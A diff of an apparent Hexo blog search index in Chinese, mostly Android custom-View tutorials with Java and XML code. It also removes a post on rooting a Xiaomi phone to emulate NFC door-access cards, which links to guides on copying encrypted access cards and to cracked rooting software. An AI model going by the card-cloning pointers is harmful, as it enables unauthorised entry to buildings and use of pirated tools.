href="https://club.huawei.com/forum.php?mod=viewthread&amp;tid=12832132" target="_blank" rel="noopener">【HRT_梦里无念】荣耀6X TWRP3.1 EMUI5.0专用 支持Data解密</a><br><a href="http://www.miui.com/shuaji-393.html" target="_blank" rel="noopener">小米线刷</a><br><a href="https://jingyan.baidu.com/article/a3a3f8112501e38da3eb8a65.html" target="_blank" rel="noopener">小米手机MIUI9开发版开启ROOT权限方法</a><br><a href="http://www.miui.com/thread-8282972-1-1.html" target="_blank" rel="noopener">小米开发版获取完整root教程</a><br><a href="https://blog.csdn.net/xCnhYKoHj3eK/article/details/79016306" target="_blank" rel="noopener">【解锁教程&amp;ROOT教程】支持全系华为</a><br><a href="https://jingyan.baidu.com/article/363872ec7246e36e4ba16f24.html" target="_blank" rel="noopener">怎么强制解华为锁bl锁</a><br><a href="https://www.52pojie.cn/thread-780859-1-1.html" target="_blank" rel="noopener">求这个型号的华为手机强制解除BL锁有效方法</a><br><a href="http://downloadandroidrom.com/" target="_blank" rel="noopener">Browse files by Device</a><br><a href="https://developers.google.com/android/drivers" target="_blank" rel="noopener">Driver Binaries for Nexus and Pixel Devices</a><br><a href="https://www.xda-developers.com/" target="_blank" rel="noopener">xda-developers</a>  </p>
+]]></content>
+      <categories>
+        <category>android</category>
+      </categories>
+      <tags>
+        <tag>android</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>android自定义View处理padding和wrap_content和自定义属性</title>
     <url>/post/1728291640.html</url>
     <content><![CDATA[<h2 id="android-View-处理padding"><a href="#android-View-处理padding" class="headerlink" title="android View 处理padding"></a>android View 处理padding</h2><pre><code>@Override
@@ -4920,49 +4968,6 @@ protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec) {
     }
 }
 </code></pre>]]></content>
-      <categories>
-        <category>android</category>
-      </categories>
-      <tags>
-        <tag>android</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>android nfc模拟卡</title>
-    <url>/post/2987589929.html</url>
-    <content><![CDATA[<p><a href="http://bbs.xiaomi.cn/t-30553502-1-o1" target="_blank" rel="noopener">搞定加密卡！小米门禁卡模拟那些事</a>  </p>
-<h2 id="手机信息"><a href="#手机信息" class="headerlink" title="手机信息"></a>手机信息</h2><pre><code>手机：小米5s
-版本：MIUI10 8.11.1 开发版
-</code></pre><h2 id="0x00-解锁-amp-amp-刷机"><a href="#0x00-解锁-amp-amp-刷机" class="headerlink" title="0x00 解锁&amp;&amp;刷机"></a>0x00 解锁&amp;&amp;刷机</h2><p><strong>解锁</strong>  </p>
-<p>首先登录小米官网获取解锁工具<br><a href="https://unlock.update.miui.com" target="_blank" rel="noopener">解锁工具下载</a><br><a href="http://www.miui.com/thread-3367802-1-1.html" target="_blank" rel="noopener">小米手机解锁 Bootloader 教程以及常见问题</a>  </p>
-<p>官网给的解决方案： </p>
-<pre><code>请按照以下流程进行操作：
-1.进入“设置 -&gt; 开发者选项 -&gt; 设备解锁状态”中绑定账号和设备；
-2.手动进入Bootloader模式（关机后，同时按住开机键和音量下键）；
-3.通过USB连接手机，点击 “解锁”按钮；
-</code></pre><p>解锁的时候要检查解锁账号，要3天验证在这个手机登录  </p>
-<p>1.小米手机设置<br>设置-小米账号-登录小米账号<br>关机<br>进入Bootloader模式(同时按住开机键和音量下键)<br>会出现一个安卓小机器人下面FASTBOOT文字<br>usb连接电脑  </p>
-<p>2.电脑端<br>打开下载的手机解锁工具<br>点击解锁<br>然后弹出确认解锁<br>等待解锁  </p>
-<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/25/01.png" alt=""></p>
-<pre><code>设置 -&gt; 更多设置 -&gt; 开发者选项 -&gt; 设备解锁状态 -&gt; 绑定账号和设备  
-关机 -&gt; 同时按住开机键和音量下键 -&gt; 打开下载的工具 -&gt; 手机连接 -&gt; 解锁 
-
-
-开发者选项:
-我的设备 - 全部参数 - MIUI版本 多次按 进入开发者模式  
-</code></pre><p><strong>刷机</strong>  </p>
-<p><a href="http://www.miui.com/shuaji-393.html" target="_blank" rel="noopener">通用线刷教程</a>  </p>
-<p>参考了上面的文章  </p>
-<p>步骤：<br>下载通用解锁工具<br>下载线刷包下载开发版的(开发版自带root)<br>手机关机状态下，同时按住 音量下+电源键 进入Fastboot模式将手机USB连接电脑。<br>usb连接电脑<br>解压线刷包<br>打开通用解锁工具<br>选择解压目录<br>点击加载设备<br>刷机<br>等待成功  </p>
-<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/25/02.png" alt=""></p>
-<h2 id="0x01-nfc软件"><a href="#0x01-nfc软件" class="headerlink" title="0x01 nfc软件"></a>0x01 nfc软件</h2><p>在酷安找到了一些app<br><a href="https://www.coolapk.com/search?q=nfc" target="_blank" rel="noopener">nfc list</a><br>然后测试了一下NFC卡模拟  </p>
-<p>然后给NFC卡模拟 root权限 和 nfc权限  </p>
-<p>安全中心-应用管理-权限-ROOT权限管理 给 NFC卡模拟  </p>
-<p><strong>然后测试软件</strong><br>卡读取成功了<br>然后测试门禁不好使  </p>
-<hr>
-<p>后文再续</p>
-<p><a href="http://www.miui.com/thread-5869303-1-1.html" target="_blank" rel="noopener">【教程】让你的手机模拟门禁卡 拿着手机进小区 加密也模拟</a><br><a href="http://tieba.baidu.com/p/5759500931" target="_blank" rel="noopener">成功复制加密门禁卡！！！</a><br><a href="https://club.huawei.com/thread-12231900-1-1.html" target="_blank" rel="noopener">【原创】浅谈NFC手机模拟门禁卡、饭卡（非ROOT）-精华帖</a><br><a href="https://www.coolapk.com/apk/com.yuanwofei.cardemulator" target="_blank" rel="noopener">NFC卡模拟</a><br><a href="https://www.freebuf.com/geek/80368.html" target="_blank" rel="noopener">如何利用Nexus 5伪造一张门禁卡</a><br><a href="http://www.jinciwei.cn/f268134.html" target="_blank" rel="noopener">搞定加密卡！小米门禁卡模拟那些事</a><br><a href="https://club.huawei.com/thread-14272732-1-1.html" target="_blank" rel="noopener">Root神器–超级授权SuperSU_v2.82-SR5专业破解最新版！</a><br><a href="https://club.huawei.com/forum.php?mod=viewthread&amp;tid=12832132" target="_blank" rel="noopener">【HRT_梦里无念】荣耀6X TWRP3.1 EMUI5.0专用 支持Data解密</a><br><a href="http://www.miui.com/shuaji-393.html" target="_blank" rel="noopener">小米线刷</a><br><a href="https://jingyan.baidu.com/article/a3a3f8112501e38da3eb8a65.html" target="_blank" rel="noopener">小米手机MIUI9开发版开启ROOT权限方法</a><br><a href="http://www.miui.com/thread-8282972-1-1.html" target="_blank" rel="noopener">小米开发版获取完整root教程</a><br><a href="https://blog.csdn.net/xCnhYKoHj3eK/article/details/79016306" target="_blank" rel="noopener">【解锁教程&amp;ROOT教程】支持全系华为</a><br><a href="https://jingyan.baidu.com/article/363872ec7246e36e4ba16f24.html" target="_blank" rel="noopener">怎么强制解华为锁bl锁</a><br><a href="https://www.52pojie.cn/thread-780859-1-1.html" target="_blank" rel="noopener">求这个型号的华为手机强制解除BL锁有效方法</a><br><a href="http://downloadandroidrom.com/" target="_blank" rel="noopener">Browse files by Device</a><br><a href="https://developers.google.com/android/drivers" target="_blank" rel="noopener">Driver Binaries for Nexus and Pixel Devices</a><br><a href="https://www.xda-developers.com/" target="_blank" rel="noopener">xda-developers</a>  </p>
-]]></content>
       <categories>
         <category>android</category>
       </categories>
@@ -5616,6 +5621,28 @@ ndk.dir
       </tags>
   </entry>
   <entry>
+    <title>android里的文本样式</title>
+    <url>/post/3707607800.html</url>
+    <content><![CDATA[<h2 id="修改text的大小和颜色"><a href="#修改text的大小和颜色" class="headerlink" title="修改text的大小和颜色"></a>修改text的大小和颜色</h2><p>strings.xml  </p>
+<pre><code>&lt;string name=&quot;str_event_statistics&quot;&gt;事件统计 &amp;lt;small&amp;gt;（近 %1$s 场）&amp;lt;small&amp;gt;&lt;/string&gt;
+</code></pre><p>java  </p>
+<pre><code>String textSource = context.getResources().getString(R.string.str_event_statistics)+&quot;&lt;small&gt;（近10场）&lt;/small&gt;&quot;;
+
+String textSource = context.getResources().getString(R.string.str_event_statistics,&quot;11&quot;);
+title_tv.setText(Html.fromHtml(textSource));
+
+String textSource = &quot;江苏苏宁VS上海上港-&lt;font color=&#39;#FF6059&#39;&gt;1胜&lt;/font&gt; &lt;font color=&#39;#41CFFF&#39;&gt;1平&lt;/font&gt; &lt;font color=&#39;#7ED321&#39;&gt;3负&lt;/font&gt;&quot;;
+    viewHolder.tv1.setText(Html.fromHtml(textSource));
+</code></pre><p><a href="https://blog.csdn.net/singwhatiwanna/article/details/18363899" target="_blank" rel="noopener">给TextView加上多彩效果：改变部分字体的大小和颜色</a><br><a href="https://www.cnblogs.com/Eric-zhao/p/5230007.html" target="_blank" rel="noopener">android中string.xml中%1$s、%1$d等的用法</a><br><a href="https://www.jianshu.com/p/f6cef78e8652" target="_blank" rel="noopener">修改TextView中部分文本的字体及颜色</a>  </p>
+]]></content>
+      <categories>
+        <category>android</category>
+      </categories>
+      <tags>
+        <tag>android</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>android里layout.xml的include</title>
     <url>/post/2155240333.html</url>
     <content><![CDATA[<pre><code>include 两个一样的layout
@@ -5697,222 +5724,6 @@ item2_tv4.setText(&quot;64-23&quot;);
 item2_tv5.setText(&quot;进球-失球&quot;);
 item2_tv6.setText(&quot;1连胜中&quot;);
 </code></pre>]]></content>
-      <categories>
-        <category>android</category>
-      </categories>
-      <tags>
-        <tag>android</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>android里的文本样式</title>
-    <url>/post/3707607800.html</url>
-    <content><![CDATA[<h2 id="修改text的大小和颜色"><a href="#修改text的大小和颜色" class="headerlink" title="修改text的大小和颜色"></a>修改text的大小和颜色</h2><p>strings.xml  </p>
-<pre><code>&lt;string name=&quot;str_event_statistics&quot;&gt;事件统计 &amp;lt;small&amp;gt;（近 %1$s 场）&amp;lt;small&amp;gt;&lt;/string&gt;
-</code></pre><p>java  </p>
-<pre><code>String textSource = context.getResources().getString(R.string.str_event_statistics)+&quot;&lt;small&gt;（近10场）&lt;/small&gt;&quot;;
-
-String textSource = context.getResources().getString(R.string.str_event_statistics,&quot;11&quot;);
-title_tv.setText(Html.fromHtml(textSource));
-
-String textSource = &quot;江苏苏宁VS上海上港-&lt;font color=&#39;#FF6059&#39;&gt;1胜&lt;/font&gt; &lt;font color=&#39;#41CFFF&#39;&gt;1平&lt;/font&gt; &lt;font color=&#39;#7ED321&#39;&gt;3负&lt;/font&gt;&quot;;
-    viewHolder.tv1.setText(Html.fromHtml(textSource));
-</code></pre><p><a href="https://blog.csdn.net/singwhatiwanna/article/details/18363899" target="_blank" rel="noopener">给TextView加上多彩效果：改变部分字体的大小和颜色</a><br><a href="https://www.cnblogs.com/Eric-zhao/p/5230007.html" target="_blank" rel="noopener">android中string.xml中%1$s、%1$d等的用法</a><br><a href="https://www.jianshu.com/p/f6cef78e8652" target="_blank" rel="noopener">修改TextView中部分文本的字体及颜色</a>  </p>
-]]></content>
-      <categories>
-        <category>android</category>
-      </categories>
-      <tags>
-        <tag>android</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>android自定义view圆形进度条</title>
-    <url>/post/2381054113.html</url>
-    <content><![CDATA[<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/24/03.jpg" alt="效果图"></p>
-<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>attrs.xml  </p>
-<pre><code>&lt;declare-styleable name=&quot;RingProgressBarView&quot;&gt;
-    &lt;attr name=&quot;circle_radius&quot; format=&quot;dimension&quot;/&gt;
-    &lt;attr name=&quot;stroke_width&quot; format=&quot;dimension&quot;/&gt;
-    &lt;attr name=&quot;circle_color&quot; format=&quot;color&quot;/&gt;
-    &lt;attr name=&quot;ring_background_color&quot; format=&quot;color&quot;/&gt;
-    &lt;attr name=&quot;ring_cor&quot; forLineProgressBarViewmat=&quot;color&quot;/&gt;
-    &lt;attr name=&quot;font_color&quot; format=&quot;color&quot;/&gt;
-    &lt;attr name=&quot;font_size&quot; format=&quot;dimension&quot;/&gt;
-&lt;/declare-styleable&gt;
-</code></pre><p>RingProgressBarView.java  </p>
-<pre><code>public class RingProgressBarView extends View {
-
-    // 画实心圆的画笔
-    private Paint mCirclePaint;
-    // 画圆环的画笔
-    private Paint mRingPaint;
-    // 画圆环的画笔背景色
-    private Paint mRingPaintBg;
-    // 画字体的画笔
-    private Paint mTextPaint;
-    // 圆形颜色
-    private int mCircleColor;
-    // 圆环颜色
-    private int mRingColor;
-    // 圆环背景颜色
-    private int mRingBgColor;
-    // 字体颜色
-    private int mTextColor;
-    // 字体大小
-    private float mTextSize;
-    // 半径
-    private float mRadius;
-    // 圆环半径
-    private float mRingRadius;
-    // 圆环宽度
-    private float mStrokeWidth;
-    // 圆心x坐标
-    private int mXCenter;
-    // 圆心y坐标
-    private int mYCenter;
-    // 字的长度
-    private float mTxtWidth;
-    // 字的高度
-    private float mTxtHeight;
-    // 总进度
-    private int mTotalProgress = 100;
-    // 当前进度
-    private float mProgress;
-
-    private String mProgressTxt;
-
-    public RingProgressBarView(Context context, @Nullable AttributeSet attrs) {
-        super(context, attrs);
-        initAttrs(context, attrs);
-        initVariable();
-    }
-
-    private void initAttrs(Context context,AttributeSet attrs) {
-        TypedArray typeArray = context.getTheme().obtainStyledAttributes(attrs,
-                R.styleable.RingProgressBarView, 0, 0);
-        mRadius = typeArray.getDimension(R.styleable.RingProgressBarView_circle_radius, dp2px(30));
-        mStrokeWidth = typeArray.getDimension(R.styleable.RingProgressBarView_stroke_width,dp2px(6));
-        mCircleColor = typeArray.getColor(R.styleable.RingProgressBarView_circle_color, Color.parseColor(&quot;#ffffff&quot;));
-        mRingColor = typeArray.getColor(R.styleable.RingProgressBarView_ring_cor, Color.parseColor(&quot;#FF6059&quot;));
-        mRingBgColor = typeArray.getColor(R.styleable.RingProgressBarView_ring_background_color,Color.parseColor(&quot;#E3E2E2&quot;));
-        mTextColor = typeArray.getColor(R.styleable.RingProgressBarView_font_color,Color.parseColor(&quot;#2E3D45&quot;));
-        mTextSize = typeArray.getDimension(R.styleable.RingProgressBarView_font_size,mRadius / 3);
-        mRingRadius = mRadius + mStrokeWidth / 2;
-    }
-
-    private void initVariable() {
-        //内圆
-        mCirclePaint = getPaint(Paint.Style.FILL,mCircleColor);
-
-
-        //外圆弧背景
-        mRingPaintBg = getPaint(Paint.Style.STROKE,mRingBgColor,mStrokeWidth);
-
-        //外圆弧
-        mRingPaint = getPaint(Paint.Style.STROKE,mRingColor,mStrokeWidth);
-        mRingPaint.setStrokeCap(Paint.Cap.ROUND);//设置线冒样式，有圆 有方
-
-        //中间字
-        mTextPaint = getPaint(Paint.Style.FILL,mTextColor);
-        mTextPaint.setTextSize(mTextSize);
-
-        Paint.FontMetrics fm = mTextPaint.getFontMetrics();
-        mTxtHeight = (int) Math.ceil(fm.descent - fm.ascent);
-    }
-
-    private Paint getPaint(Paint.Style style,int color){
-        Paint paint = new Paint(Paint.ANTI_ALIAS_FLAG); //抗锯齿标志
-        paint.setStyle(style);
-        paint.setColor(color);
-        paint.setAntiAlias(true);
-        return paint;
-    }
-    private Paint getPaint(Paint.Style style,int color,float width){
-        Paint paint = getPaint(style,color);
-        paint.setStrokeWidth(width);
-        return paint;
-    }
-
-    @Override
-    protected void onDraw(Canvas canvas) {
-//        super.onDraw(canvas);
-        mXCenter = getWidth() / 2;
-        mYCenter = getHeight() / 2;
-
-        //内圆
-        canvas.drawCircle(mXCenter, mYCenter, mRadius, mCirclePaint);
-
-        //外圆弧背景
-        RectF oval1 = new RectF();
-        oval1.left = (mXCenter - mRingRadius);
-        oval1.top = (mYCenter - mRingRadius);
-        oval1.right = mRingRadius * 2 + (mXCenter - mRingRadius);
-        oval1.bottom = mRingRadius * 2 + (mYCenter - mRingRadius);
-        canvas.drawArc(oval1, 0, 360, false, mRingPaintBg); //圆弧所在的椭圆对象、圆弧的起始角度、圆弧的角度、是否显示半径连线
-
-        //外圆弧
-        if (mProgress &gt; 0 ) {
-            RectF oval = new RectF();
-            oval.left = (mXCenter - mRingRadius);
-            oval.top = (mYCenter - mRingRadius);
-            oval.right = mRingRadius * 2 + (mXCenter - mRingRadius);
-            oval.bottom = mRingRadius * 2 + (mYCenter - mRingRadius);
-            canvas.drawArc(oval, -90, -(((float)mProgress / mTotalProgress) * 360), false, mRingPaint); //
-
-            //字体
-            String txt = mProgressTxt + &quot;%&quot;;
-            mTxtWidth = mTextPaint.measureText(txt, 0, txt.length());
-            canvas.drawText(txt, mXCenter - mTxtWidth / 2, mYCenter + mTxtHeight / 4, mTextPaint);
-        }
-    }
-
-    //设置进度
-    public void setProgress(float progress) {
-        final ValueAnimator anim = ValueAnimator.ofFloat(0,progress);
-        anim.setDuration(3000);
-        anim.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {
-            @Override
-            public void onAnimationUpdate(ValueAnimator animator) {
-                mProgress  = (float)animator.getAnimatedValue();
-                DecimalFormat df2 = new DecimalFormat(&quot;###.00&quot;);
-                mProgressTxt= df2.format(mProgress);
-                invalidate();
-            }
-        });
-        anim.start();
-    }
-    protected int dp2px(int dpVal) {
-        return (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP,dpVal,getResources().getDisplayMetrics());
-    }
-}
-</code></pre><p>activity_ring_progress_bar.xml  </p>
-<pre><code>&lt;android.support.constraint.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
-                                             xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;
-                                             android:layout_width=&quot;match_parent&quot;
-                                             android:layout_height=&quot;match_parent&quot;&gt;
-
-    &lt;com.demo.android_view.mview.RingProgressBarView
-            android:id=&quot;@+id/rpbv&quot;
-            android:layout_width=&quot;120dp&quot;
-            android:layout_height=&quot;120dp&quot;/&gt;
-&lt;/android.support.constraint.ConstraintLayout&gt;
-</code></pre><p>RingProgressBarActivity.java  </p>
-<pre><code>public class RingProgressBarActivity extends AppCompatActivity {
-
-    private RingProgressBarView rpbv;
-
-    @Override
-    protected void onCreate(@Nullable Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_ring_progress_bar);
-        rpbv = findViewById(R.id.rpbv);
-        rpbv.setProgress(100f);
-    }
-}
-</code></pre><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p><a href="https://github.com/tea9/android_view" target="_blank" rel="noopener">源代码</a>  </p>
-<h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://blog.csdn.net/qq_32519693/article/details/76726525" target="_blank" rel="noopener">Android 自定义漂亮的圆形进度条</a><br><a href="https://blog.csdn.net/zhangqunshuai/article/details/80760277" target="_blank" rel="noopener">Android自定义View之画圆环(进阶篇:圆形进度条)</a><br><a href="https://blog.csdn.net/mengks1987/article/details/77771465" target="_blank" rel="noopener">Android 自定义View实例之进度圆环</a><br><a href="https://blog.csdn.net/ahuyangdong/article/details/79942824" target="_blank" rel="noopener">Android花样loading进度条（二）-简单环形进度条</a><br><a href="https://www.jianshu.com/p/fd5616685d3d" target="_blank" rel="noopener">Android自定义圆形进度条</a><br><a href="https://blog.csdn.net/anonymousprogrammer/article/details/65634886" target="_blank" rel="noopener">android自定义控件之圆形进度条（带动画）</a>  </p>
-]]></content>
       <categories>
         <category>android</category>
       </categories>
@@ -6254,6 +6065,200 @@ canvas.drawLine(length_b, height / 2, length_b+2, height / 2, num_b_paint);
 }
 </code></pre><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p><a href="https://github.com/tea9/android_view" target="_blank" rel="noopener">源代码</a>  </p>
 <h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://blog.csdn.net/qq_38367802/article/details/77566102" target="_blank" rel="noopener">自定义View之线性百分比进度条</a><br><a href="https://blog.csdn.net/qq_31179919/article/details/52596965" target="_blank" rel="noopener">自定义View实现进度条</a><br><a href="https://juejin.im/entry/585a6b80ac502e006711fa8d" target="_blank" rel="noopener">Android 实现一个蛮酷的加载进度条</a><br><a href="https://blog.csdn.net/xuewater/article/details/45247885" target="_blank" rel="noopener">Android绘图总结（Bitmap，Canvas，Paint，圆角）</a><br><a href="https://www.sohu.com/a/203382364_659256" target="_blank" rel="noopener">一个功能强大的自定义SeekBar</a><br><a href="https://blog.csdn.net/harvic880925/article/details/50995268" target="_blank" rel="noopener">Android自定义控件三部曲文章索引</a>  </p>
+]]></content>
+      <categories>
+        <category>android</category>
+      </categories>
+      <tags>
+        <tag>android</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>android自定义view圆形进度条</title>
+    <url>/post/2381054113.html</url>
+    <content><![CDATA[<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/24/03.jpg" alt="效果图"></p>
+<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>attrs.xml  </p>
+<pre><code>&lt;declare-styleable name=&quot;RingProgressBarView&quot;&gt;
+    &lt;attr name=&quot;circle_radius&quot; format=&quot;dimension&quot;/&gt;
+    &lt;attr name=&quot;stroke_width&quot; format=&quot;dimension&quot;/&gt;
+    &lt;attr name=&quot;circle_color&quot; format=&quot;color&quot;/&gt;
+    &lt;attr name=&quot;ring_background_color&quot; format=&quot;color&quot;/&gt;
+    &lt;attr name=&quot;ring_cor&quot; forLineProgressBarViewmat=&quot;color&quot;/&gt;
+    &lt;attr name=&quot;font_color&quot; format=&quot;color&quot;/&gt;
+    &lt;attr name=&quot;font_size&quot; format=&quot;dimension&quot;/&gt;
+&lt;/declare-styleable&gt;
+</code></pre><p>RingProgressBarView.java  </p>
+<pre><code>public class RingProgressBarView extends View {
+
+    // 画实心圆的画笔
+    private Paint mCirclePaint;
+    // 画圆环的画笔
+    private Paint mRingPaint;
+    // 画圆环的画笔背景色
+    private Paint mRingPaintBg;
+    // 画字体的画笔
+    private Paint mTextPaint;
+    // 圆形颜色
+    private int mCircleColor;
+    // 圆环颜色
+    private int mRingColor;
+    // 圆环背景颜色
+    private int mRingBgColor;
+    // 字体颜色
+    private int mTextColor;
+    // 字体大小
+    private float mTextSize;
+    // 半径
+    private float mRadius;
+    // 圆环半径
+    private float mRingRadius;
+    // 圆环宽度
+    private float mStrokeWidth;
+    // 圆心x坐标
+    private int mXCenter;
+    // 圆心y坐标
+    private int mYCenter;
+    // 字的长度
+    private float mTxtWidth;
+    // 字的高度
+    private float mTxtHeight;
+    // 总进度
+    private int mTotalProgress = 100;
+    // 当前进度
+    private float mProgress;
+
+    private String mProgressTxt;
+
+    public RingProgressBarView(Context context, @Nullable AttributeSet attrs) {
+        super(context, attrs);
+        initAttrs(context, attrs);
+        initVariable();
+    }
+
+    private void initAttrs(Context context,AttributeSet attrs) {
+        TypedArray typeArray = context.getTheme().obtainStyledAttributes(attrs,
+                R.styleable.RingProgressBarView, 0, 0);
+        mRadius = typeArray.getDimension(R.styleable.RingProgressBarView_circle_radius, dp2px(30));
+        mStrokeWidth = typeArray.getDimension(R.styleable.RingProgressBarView_stroke_width,dp2px(6));
+        mCircleColor = typeArray.getColor(R.styleable.RingProgressBarView_circle_color, Color.parseColor(&quot;#ffffff&quot;));
+        mRingColor = typeArray.getColor(R.styleable.RingProgressBarView_ring_cor, Color.parseColor(&quot;#FF6059&quot;));
+        mRingBgColor = typeArray.getColor(R.styleable.RingProgressBarView_ring_background_color,Color.parseColor(&quot;#E3E2E2&quot;));
+        mTextColor = typeArray.getColor(R.styleable.RingProgressBarView_font_color,Color.parseColor(&quot;#2E3D45&quot;));
+        mTextSize = typeArray.getDimension(R.styleable.RingProgressBarView_font_size,mRadius / 3);
+        mRingRadius = mRadius + mStrokeWidth / 2;
+    }
+
+    private void initVariable() {
+        //内圆
+        mCirclePaint = getPaint(Paint.Style.FILL,mCircleColor);
+
+
+        //外圆弧背景
+        mRingPaintBg = getPaint(Paint.Style.STROKE,mRingBgColor,mStrokeWidth);
+
+        //外圆弧
+        mRingPaint = getPaint(Paint.Style.STROKE,mRingColor,mStrokeWidth);
+        mRingPaint.setStrokeCap(Paint.Cap.ROUND);//设置线冒样式，有圆 有方
+
+        //中间字
+        mTextPaint = getPaint(Paint.Style.FILL,mTextColor);
+        mTextPaint.setTextSize(mTextSize);
+
+        Paint.FontMetrics fm = mTextPaint.getFontMetrics();
+        mTxtHeight = (int) Math.ceil(fm.descent - fm.ascent);
+    }
+
+    private Paint getPaint(Paint.Style style,int color){
+        Paint paint = new Paint(Paint.ANTI_ALIAS_FLAG); //抗锯齿标志
+        paint.setStyle(style);
+        paint.setColor(color);
+        paint.setAntiAlias(true);
+        return paint;
+    }
+    private Paint getPaint(Paint.Style style,int color,float width){
+        Paint paint = getPaint(style,color);
+        paint.setStrokeWidth(width);
+        return paint;
+    }
+
+    @Override
+    protected void onDraw(Canvas canvas) {
+//        super.onDraw(canvas);
+        mXCenter = getWidth() / 2;
+        mYCenter = getHeight() / 2;
+
+        //内圆
+        canvas.drawCircle(mXCenter, mYCenter, mRadius, mCirclePaint);
+
+        //外圆弧背景
+        RectF oval1 = new RectF();
+        oval1.left = (mXCenter - mRingRadius);
+        oval1.top = (mYCenter - mRingRadius);
+        oval1.right = mRingRadius * 2 + (mXCenter - mRingRadius);
+        oval1.bottom = mRingRadius * 2 + (mYCenter - mRingRadius);
+        canvas.drawArc(oval1, 0, 360, false, mRingPaintBg); //圆弧所在的椭圆对象、圆弧的起始角度、圆弧的角度、是否显示半径连线
+
+        //外圆弧
+        if (mProgress &gt; 0 ) {
+            RectF oval = new RectF();
+            oval.left = (mXCenter - mRingRadius);
+            oval.top = (mYCenter - mRingRadius);
+            oval.right = mRingRadius * 2 + (mXCenter - mRingRadius);
+            oval.bottom = mRingRadius * 2 + (mYCenter - mRingRadius);
+            canvas.drawArc(oval, -90, -(((float)mProgress / mTotalProgress) * 360), false, mRingPaint); //
+
+            //字体
+            String txt = mProgressTxt + &quot;%&quot;;
+            mTxtWidth = mTextPaint.measureText(txt, 0, txt.length());
+            canvas.drawText(txt, mXCenter - mTxtWidth / 2, mYCenter + mTxtHeight / 4, mTextPaint);
+        }
+    }
+
+    //设置进度
+    public void setProgress(float progress) {
+        final ValueAnimator anim = ValueAnimator.ofFloat(0,progress);
+        anim.setDuration(3000);
+        anim.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {
+            @Override
+            public void onAnimationUpdate(ValueAnimator animator) {
+                mProgress  = (float)animator.getAnimatedValue();
+                DecimalFormat df2 = new DecimalFormat(&quot;###.00&quot;);
+                mProgressTxt= df2.format(mProgress);
+                invalidate();
+            }
+        });
+        anim.start();
+    }
+    protected int dp2px(int dpVal) {
+        return (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP,dpVal,getResources().getDisplayMetrics());
+    }
+}
+</code></pre><p>activity_ring_progress_bar.xml  </p>
+<pre><code>&lt;android.support.constraint.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
+                                             xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;
+                                             android:layout_width=&quot;match_parent&quot;
+                                             android:layout_height=&quot;match_parent&quot;&gt;
+
+    &lt;com.demo.android_view.mview.RingProgressBarView
+            android:id=&quot;@+id/rpbv&quot;
+            android:layout_width=&quot;120dp&quot;
+            android:layout_height=&quot;120dp&quot;/&gt;
+&lt;/android.support.constraint.ConstraintLayout&gt;
+</code></pre><p>RingProgressBarActivity.java  </p>
+<pre><code>public class RingProgressBarActivity extends AppCompatActivity {
+
+    private RingProgressBarView rpbv;
+
+    @Override
+    protected void onCreate(@Nullable Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_ring_progress_bar);
+        rpbv = findViewById(R.id.rpbv);
+        rpbv.setProgress(100f);
+    }
+}
+</code></pre><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p><a href="https://github.com/tea9/android_view" target="_blank" rel="noopener">源代码</a>  </p>
+<h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://blog.csdn.net/qq_32519693/article/details/76726525" target="_blank" rel="noopener">Android 自定义漂亮的圆形进度条</a><br><a href="https://blog.csdn.net/zhangqunshuai/article/details/80760277" target="_blank" rel="noopener">Android自定义View之画圆环(进阶篇:圆形进度条)</a><br><a href="https://blog.csdn.net/mengks1987/article/details/77771465" target="_blank" rel="noopener">Android 自定义View实例之进度圆环</a><br><a href="https://blog.csdn.net/ahuyangdong/article/details/79942824" target="_blank" rel="noopener">Android花样loading进度条（二）-简单环形进度条</a><br><a href="https://www.jianshu.com/p/fd5616685d3d" target="_blank" rel="noopener">Android自定义圆形进度条</a><br><a href="https://blog.csdn.net/anonymousprogrammer/article/details/65634886" target="_blank" rel="noopener">android自定义控件之圆形进度条（带动画）</a>  </p>
 ]]></content>
       <categories>
         <category>android</category>
@@ -6725,68 +6730,6 @@ pip install request
       </tags>
   </entry>
   <entry>
-    <title>Android逆向工具介绍</title>
-    <url>/post/1830912127.html</url>
-    <content><![CDATA[<h2 id="反汇编工具"><a href="#反汇编工具" class="headerlink" title="反汇编工具"></a>反汇编工具</h2><ul>
-<li><strong>Apktool/ShakaApktool</strong></li>
-</ul>
-<p><a href="https://bitbucket.org/iBotPeaches/apktool/downloads/" target="_blank" rel="noopener">apktool Download</a>  </p>
-<p><a href="https://github.com/rover12421/ShakaApktool" target="_blank" rel="noopener">ShakaApktool Github</a> 作者已经不更新了  </p>
-<ul>
-<li><p><strong>smali/baksmali</strong></p>
-</li>
-<li><p><strong>dex2jar</strong></p>
-</li>
-<li><p><strong>enjarify</strong></p>
-</li>
-</ul>
